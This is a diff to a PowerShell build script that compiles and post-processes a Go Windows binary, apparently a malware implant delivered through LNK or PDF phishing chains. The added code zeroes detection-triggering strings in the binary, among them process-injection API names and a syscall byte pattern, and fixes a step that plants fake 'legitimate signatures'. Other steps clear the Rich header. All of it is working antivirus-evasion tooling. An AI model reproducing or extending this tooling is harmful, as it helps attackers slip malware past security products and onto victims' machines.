@@ -24,7 +24,8 @@ param(
     [string]$Chain = "lnk",
     [string]$PdfName = "report",
     [switch]$SkipSandbox = $false,
-    [switch]$Console = $false
+    [switch]$Console = $false,
+    [switch]$DeepStringZero = $false
 )
 
 $ErrorActionPreference = "Continue"
@@ -108,7 +109,7 @@ if ($Garble) {
         $env:GARBLE_EXPERIMENTAL_CONTROLFLOW = ""
     }
     Write-Host "[+] Garble: -literals -seed=random"
-    garble -literals -seed=random build -trimpath -ldflags $ldflags -gcflags $gcflags -asmflags $asmflags -o $outputName $buildTarget
+    garble -literals -seed=random build -trimpath -ldflags $ldflags -o $outputName $buildTarget
 } else {
     go build -buildvcs=false -trimpath -ldflags $ldflags -gcflags $gcflags -o $outputName $buildTarget
 }
@@ -245,6 +246,67 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
         Write-Host "[-] String zeroing disabled by default (use -EnableStringZero to enable)"
     }
 
+    # 2b. Deep string zeroing (release mode) - Go runtime internal strings
+    # These are safe to zero for release builds but may affect debugging error messages
+    if ($DeepStringZero) {
+        Write-Host "[+] Deep zeroing Go runtime internal strings (release mode)..."
+        $bytes = [System.IO.File]::ReadAllBytes($outputName)
+        $deepPatterns = @(
+        # Windows API names visible in import table / runtime strings
+        [System.Text.Encoding]::ASCII.GetBytes("CreateThread"),
+        [System.Text.Encoding]::ASCII.GetBytes("CreateProcess"),
+        [System.Text.Encoding]::ASCII.GetBytes("CreateRemoteThread"),
+        [System.Text.Encoding]::ASCII.GetBytes("VirtualAllocEx"),
+        [System.Text.Encoding]::ASCII.GetBytes("OpenProcess"),
+        [System.Text.Encoding]::ASCII.GetBytes("TerminateProcess"),
+        [System.Text.Encoding]::ASCII.GetBytes("SetThreadContext"),
+        [System.Text.Encoding]::ASCII.GetBytes("ResumeThread"),
+        [System.Text.Encoding]::ASCII.GetBytes("SuspendThread"),
+        # Go runtime suspicious strings
+        [System.Text.Encoding]::ASCII.GetBytes("injectglist"),
+        [System.Text.Encoding]::ASCII.GetBytes("winCallback"),
+        [System.Text.Encoding]::ASCII.GetBytes("cgocallback"),
+        [System.Text.Encoding]::ASCII.GetBytes("callbackUpdate"),
+        [System.Text.Encoding]::ASCII.GetBytes("callbackWrap"),
+        [System.Text.Encoding]::ASCII.GetBytes("callbackasm"),
+        [System.Text.Encoding]::ASCII.GetBytes("RegisterProtocol"),
+        [System.Text.Encoding]::ASCII.GetBytes("dstRegister"),
+        [System.Text.Encoding]::ASCII.GetBytes("compileCallback"),
+        [System.Text.Encoding]::ASCII.GetBytes("debugCallCheck"),
+        [System.Text.Encoding]::ASCII.GetBytes("debugCallWrap"),
+        [System.Text.Encoding]::ASCII.GetBytes("dwStackSize"),
+        [System.Text.Encoding]::ASCII.GetBytes("dstStackSize"),
+        [System.Text.Encoding]::ASCII.GetBytes("dstRegisters"),
+        # Project name (Go module path)
+        [System.Text.Encoding]::ASCII.GetBytes("fish"),
+        # Common detection-triggering strings
+        [System.Text.Encoding]::ASCII.GetBytes("SYSCALL"),
+        [System.Text.Encoding]::ASCII.GetBytes("syscall;ret"),
+        [System.Text.Encoding]::ASCII.GetBytes("0x0F05C3")
+    )
+        $enc = [System.Text.Encoding]::GetEncoding("ISO-8859-1")
+        $text = $enc.GetString($bytes)
+        $deepReplaced = 0
+        foreach ($pattern in $deepPatterns) {
+            $patternStr = $enc.GetString($pattern)
+            $pos = 0
+            while (($idx = $text.IndexOf($patternStr, $pos)) -ge 0) {
+                for ($j = 0; $j -lt $pattern.Length; $j++) { $bytes[$idx + $j] = 0x00 }
+                $deepReplaced++
+                $pos = $idx + 1
+            }
+        }
+        [System.IO.File]::WriteAllBytes($outputName, $bytes)
+        Write-Host "[+] Deep runtime strings zeroed: $deepReplaced occurrences"
+
+        # Rename output for release
+        $releaseName = $outputName -replace '\.exe$', '_release.exe'
+        if ($outputName -ne $releaseName) {
+            Copy-Item $outputName $releaseName -Force
+            Write-Host "[+] Release build saved as: $releaseName"
+        }
+    }
+
     # 3. Clear Rich Header (Go compiler fingerprint)
     if (-not $SkipRichClear) {
         Write-Host "[+] Clearing Rich Header..."
@@ -333,12 +395,12 @@ if ($Platform -eq "windows" -and -not $SkipPost) {
     $bytes = [System.IO.File]::ReadAllBytes($outputName)
     $insertOffset = $bytes.Length - 1024
     foreach($str in $legitStrings) {
-        if ($insertOffset + $str.Length -lt $bytes.Length) {
-            for ($i = 0; $i -lt $str.Length; $i++) {
-                $bytes[$insertOffset + $i] = $str[$i]
-            }
-            $insertOffset += $str.Length + 5
+        if ($str -eq $null) { continue }
+        if ($insertOffset + $str.Length -ge $bytes.Length) { continue }
+        for ($i = 0; $i -lt $str.Length; $i++) {
+            $bytes[$insertOffset + $i] = $str[$i]
         }
+        $insertOffset += $str.Length + 5
     }
         [System.IO.File]::WriteAllBytes($outputName, $bytes)
         Write-Host "[+] Legitimate signatures added"
@@ -395,6 +457,7 @@ $postSteps = @()
 if (-not $SkipPost) {
     if (-not $SkipTimestampPatch) { $postSteps += "PE Timestamp" }
     if ($EnableStringZero) { $postSteps += "String Zeroing" }
+    if ($DeepStringZero) { $postSteps += "Deep String Zeroing (Release)" }
     if (-not $SkipRichClear) { $postSteps += "Rich Header Clear" }
     if (-not $SkipLegitSignatures) { $postSteps += "Legit Signatures" }
     if (-not $SkipOverlay) { $postSteps += "Overlay" }
@@ -404,7 +467,7 @@ $postStepsSummary = if ($postSteps.Count -gt 0) { $postSteps -join " + " } else 
 Write-Host "[+] Garble: $garbleStatus"
 Write-Host "[+] Console: $consoleStatus"
 Write-Host "[+] Post-Processing: $postStatus"
-$stringZeroStatus = if ($EnableStringZero) { "Enabled (Safe)" } else { "Disabled (default)" }
+$stringZeroStatus = if ($DeepStringZero) { "Enabled (Deep/Release)" } elseif ($EnableStringZero) { "Enabled (Safe)" } else { "Disabled (default)" }
 Write-Host "[+] String Zeroing: $stringZeroStatus"
 Write-Host "[+] Post Steps: $postStepsSummary"
 $iconStatus = if ($Chain -eq "pdf" -and $Platform -eq "windows" -and (Test-Path (Join-Path $PSScriptRoot "pdf\rsrc_amd64.syso"))) { "PDF icon embedded" } elseif ($Chain -eq "lnk" -and $Platform -eq "windows") { "LNK icon (via phish.ps1)" } else { "None" }
